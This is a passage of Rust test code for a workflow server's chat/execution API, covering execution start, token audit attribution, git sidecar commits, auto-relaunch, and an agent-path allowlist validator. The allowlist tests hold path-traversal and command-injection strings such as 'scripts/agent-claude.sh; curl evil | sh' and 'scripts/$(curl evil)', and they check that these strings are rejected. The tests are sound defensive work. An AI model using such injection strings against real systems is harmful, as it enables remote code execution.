        let body = body_json(resp.into_body()).await;
        assert!(body["pid"].as_u64().unwrap() > 0);
        assert_eq!(body["status"].as_str().unwrap(), "running");

        tokio::time::sleep(std::time::Duration::from_millis(200)).await;

        let req = Request::builder()
            .method("GET")
            .uri(format!("/api/chat/session/{}/execution", id))
            .body(Body::empty())
            .unwrap();
        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);
        let body = body_json(resp.into_body()).await;
        assert_eq!(body["status"].as_str().unwrap(), "exited");
        assert_eq!(body["exit_code"].as_i64().unwrap(), 0);

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/start-execution", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_ne!(resp.status(), StatusCode::CONFLICT);
        drop(pkg);
    }

    /// R4: the Start press must attribute the minted ExecutionToken to
    /// the authenticated SME owner (from the request's
    /// `RequestPrincipal`), not the `System` sentinel. `make_router`'s
    /// `RequestPrincipal::test_default()` is `Owner { user: "local" }`,
    /// so a successful press mints a token with
    /// `granted_by = AuditActor::User("local")`.
    #[tokio::test]
    async fn start_execution_attributes_token_to_principal_owner() {
        use ecaa_workflow_conversation::audit_actor::AuditActor;

        if !std::path::Path::new("/usr/bin/true").exists() {
            eprintln!("skip: /usr/bin/true missing");
            return;
        }
        let pkg = tempfile::tempdir().unwrap();
        let (router, app) = make_router_with_harness_bin(vec![], "/usr/bin/true").await;
        let id =
            seed_session_with_completed_task(&app, "t_demo", Some(pkg.path().to_path_buf())).await;

        // The mint helper binds to `pending_emission_id`; the seed
        // helper doesn't set one, so establish it here or the token is
        // never stored (mint returns None).
        let emission = Uuid::new_v4();
        app.conversation
            .store_handle()
            .update(id, move |s| {
                s.pending_emission_id = Some(emission);
                Ok(())
            })
            .await
            .unwrap();

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/start-execution", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);

        let session = app.conversation.get_session(id).await.unwrap();
        let token = session
            .execution_token
            .expect("a Start press must mint an execution token when a pending emission is set");
        assert_eq!(
            token.granted_by,
            AuditActor::User("local".to_string()),
            "execution token must be attributed to the authenticated owner, not System"
        );
        assert_eq!(token.request_id, emission);
        drop(pkg);
    }

    /// R4: the principal→actor map preserves the owner identity and
    /// folds Anonymous (CLI/offline) to the `System` sentinel.
    #[test]
    fn audit_actor_for_execution_token_maps_principal_variants() {
        use ecaa_workflow_conversation::audit_actor::AuditActor;

        assert_eq!(
            audit_actor_for_execution_token(&crate::auth::RequestPrincipal::Owner {
                user: "alan".to_string(),
                bearer_authenticated: true,
            }),
            AuditActor::User("alan".to_string())
        );
        assert_eq!(
            audit_actor_for_execution_token(&crate::auth::RequestPrincipal::Anonymous),
            AuditActor::System
        );
        assert_eq!(
            audit_actor_for_execution_token(&crate::auth::RequestPrincipal::HarnessAgent {
                session_id: Uuid::new_v4(),
            }),
            AuditActor::Harness
        );
    }

    #[tokio::test]
    async fn start_execution_commits_exit_status_sidecar() {
        use std::process::Command;
        use std::sync::Arc;

        fn git(pkg: &std::path::Path, args: &[&str]) -> String {
            let out = Command::new("git")
                .arg("-C")
                .arg(pkg)
                .args(args)
                .output()
                .unwrap_or_else(|e| panic!("git {:?}: {}", args, e));
            assert!(
                out.status.success(),
                "git {:?} failed\nstdout:\n{}\nstderr:\n{}",
                args,
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            String::from_utf8(out.stdout).unwrap()
        }

        if !std::path::Path::new("/usr/bin/true").exists() {
            eprintln!("skip: /usr/bin/true missing");
            return;
        }
        let pkg = tempfile::tempdir().unwrap();
        let cfg_path = pkg.path().join("git-config.json");
        std::fs::write(
            &cfg_path,
            serde_json::json!({
                "enabled": true,
                "commit_on_task_completed": true,
                "author_name": "Test",
                "author_email": "test@example.com"
            })
            .to_string(),
        )
        .unwrap();
        let (_router, mut app) = make_router(vec![]).await;
        {
            let mut cfg = (*app.config).clone();
            cfg.harness_bin_path = Some(PathBuf::from("/usr/bin/true"));
            app.config = Arc::new(cfg);
        }
        app.git_config = Arc::new(crate::git_routes::GitConfigStore::open_or_default(cfg_path));
        let router = crate::chat_routes::router(app.clone()).layer(axum::Extension(
            crate::auth::RequestPrincipal::test_default(),
        ));

        std::fs::write(pkg.path().join("WORKFLOW.json"), "{}\n").unwrap();
        git(pkg.path(), &["init"]);
        git(pkg.path(), &["config", "user.name", "Test"]);
        git(pkg.path(), &["config", "user.email", "test@example.com"]);
        git(pkg.path(), &["add", "WORKFLOW.json"]);
        git(pkg.path(), &["commit", "-m", "emit: seed package"]);

        let id =
            seed_session_with_completed_task(&app, "t_demo", Some(pkg.path().to_path_buf())).await;

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/start-execution", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.clone().oneshot(req).await.unwrap();
        assert_eq!(resp.status(), StatusCode::OK);

        let mut clean = false;
        for _ in 0..60 {
            // `--no-optional-locks`: a read-only poll must not take the
            // index lock, or it races the fire-and-forget commit hook it
            // is waiting on → "index.lock: File exists" → the commit is
            // dropped and the sidecar never reaches HEAD.
            if git(
                pkg.path(),
                &["--no-optional-locks", "status", "--porcelain"],
            )
            .trim()
            .is_empty()
                && pkg.path().join("runtime/.execution_status.json").exists()
            {
                clean = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert!(
            clean,
            "execution status git hook did not clean the package repo"
        );

        let head_files = git(pkg.path(), &["show", "--name-only", "--format=", "HEAD"]);
        assert!(
            head_files
                .lines()
                .any(|line| line == "runtime/.execution_status.json"),
            "execution status sidecar was not committed in HEAD:\n{}",
            head_files
        );
        drop(pkg);
    }

    /// End-to-end auto-relaunch: the unit tests above prove
    /// `auto_relaunch_decision` handles the four skip reasons; this
    /// test proves the wiring — POST /unblock on a Blocked session
    /// with a Ready task in WORKFLOW.json actually spawns the harness
    /// via `maybe_auto_relaunch_harness`. A pure-predicate regression
    /// (decision returns "spawn", spawn call broken) would be invisible
    /// without this test.
    #[tokio::test]
    async fn unblock_triggers_auto_relaunch_spawn() {
        if !std::path::Path::new("/usr/bin/true").exists() {
            eprintln!("skip: /usr/bin/true missing");
            return;
        }
        let pkg = tempfile::tempdir().unwrap();
        // Hand-built minimal WORKFLOW.json with one Ready task so the
        // `has_ready_task` predicate sees it. Field names match the
        // serde shape of `TaskState::Ready` (tag = "status").
        std::fs::write(
            pkg.path().join("WORKFLOW.json"),
            r#"{
                "version": "1.0",
                "workflow_id": "wf-test",
                "current_task": null,
                "tasks": {
                    "t1": {
                        "kind": "computation",
                        "state": {"status": "ready"},
                        "depends_on": [],
                        "assignee": "agent",
                        "description": "test",
                        "spec": null,
                        "resolution": null,
                        "result_ref": null,
                        "resource_class": "cpu_heavy",
                        "requires_sme_review": false,
                        "required_artifacts": []
                    }
                },
                "reverse_deps": {}
            }"#,
        )
        .unwrap();

        let (router, app) = make_router_with_harness_bin(vec![], "/usr/bin/true").await;
        let (id, _) = app.conversation.start_session(false).await.unwrap();

        // Move session to Blocked + attach the emitted package path.
        // store.update is the test-only path the SME-side endpoints
        // can't bypass without driving a full conversation flow.
        let pkg_path = pkg.path().to_path_buf();
        app.conversation
            .store_handle()
            .update(id, move |s| {
                s.emitted_package_path = Some(pkg_path.clone());
                s.state = ecaa_workflow_conversation::SessionState::Blocked {
                    blockers: vec![],
                    reason: "test blocker".into(),
                    recovery_hint: "click unblock".into(),
                    blocker_kind: None,
                    context: None,
                };
                Ok(())
            })
            .await
            .unwrap();

        let req = Request::builder()
            .method("POST")
            .uri(format!("/api/chat/session/{}/unblock", id))
            .header("content-type", "application/json")
            .body(Body::from("{}"))
            .unwrap();
        let resp = router.oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::NO_CONTENT,
            "unblock must return 204 regardless of auto-relaunch outcome"
        );

        // Auto-relaunch is fire-and-forget (spawn_blocking inside the
        // handler). Allow a moment for the spawn to complete.
        tokio::time::sleep(std::time::Duration::from_millis(300)).await;

        let entry = app
            .executions
            .get(&id)
            .expect("maybe_auto_relaunch_harness must have spawned a harness");
        assert!(entry.value().pid > 0, "spawned process must have a pid");
        drop(pkg);
    }
}

#[cfg(test)]
mod agent_path_tests {
    //! C-3 / 01 regression: agent_path allowlist. The validator
    //! reduces the caller-supplied string to a basename and refuses
    //! anything not in `ALLOWED_AGENT_SCRIPTS`. These tests pin the
    //! attack surface so a future refactor cannot reintroduce the hole.
    use super::{validate_agent_path, validate_agent_path_with_default, ALLOWED_AGENT_SCRIPTS};

    #[test]
    fn rejects_arbitrary_absolute_path() {
        let err = validate_agent_path(Some("/tmp/evil.sh".into()))
            .expect_err("absolute path must be rejected");
        assert!(err.contains("not in allowlist"), "got {err:?}");
    }

    #[test]
    fn rejects_relative_path_with_unsafe_basename() {
        // Even a relative path is rejected if the basename isn't on
        // the allowlist.
        let err = validate_agent_path(Some("scripts/../../tmp/rce.sh".into()))
            .expect_err("unsafe basename must be rejected");
        assert!(err.contains("not in allowlist"), "got {err:?}");
    }

    #[test]
    fn strips_directory_components_then_allowlists() {
        // An attacker who sneaks `../etc/agent-claude.sh` through still
        // ends up calling `scripts/agent-claude.sh` because we reduce
        // to basename before allowlist checking AND before joining the
        // scripts root.
        let p = validate_agent_path(Some("../../etc/agent-claude.sh".into()))
            .expect("basename agent-claude.sh is on the allowlist");
        assert!(p.ends_with("agent-claude.sh"), "got {p:?}");
        // Must be rooted under the configured scripts dir, not the
        // attacker's path.
        assert!(
            !p.starts_with("/etc"),
            "validator must not preserve attacker dir components: {p:?}"
        );
    }

    #[test]
    fn accepts_each_known_agent_script() {
        for name in ALLOWED_AGENT_SCRIPTS {
            let p = validate_agent_path(Some(format!("scripts/{name}")))
                .unwrap_or_else(|e| panic!("known agent {name} must be accepted, got error {e:?}"));
            assert!(p.ends_with(name));
        }
    }

    #[test]
    fn none_returns_default_agent_claude() {
        let p =
            validate_agent_path_with_default(None, None).expect("None must resolve to the default");
        assert!(p.ends_with("agent-claude.sh"), "got {p:?}");
    }

    #[test]
    fn none_honors_ecaa_default_agent_path() {
        let p =
            validate_agent_path_with_default(None, Some("scripts/agent-mock-blocker.sh".into()))
                .expect("env default must resolve through allowlist");
        assert!(p.ends_with("agent-mock-blocker.sh"), "got {p:?}");
    }

    #[test]
    fn rejects_shell_metacharacters_in_basename() {
        for evil in [
            "scripts/agent-claude.sh; curl evil | sh",
            "scripts/$(curl evil)",
            "scripts/`id`",
        ] {
            // Note: `file_name()` returns the literal basename including
            // any embedded shell metacharacters, which then fails the
            // allowlist check.
            let err = validate_agent_path(Some(evil.into()))
                .expect_err("shell metachars in basename must be refused");
            assert!(err.contains("not in allowlist"), "got {err:?}");
        }
    }
}
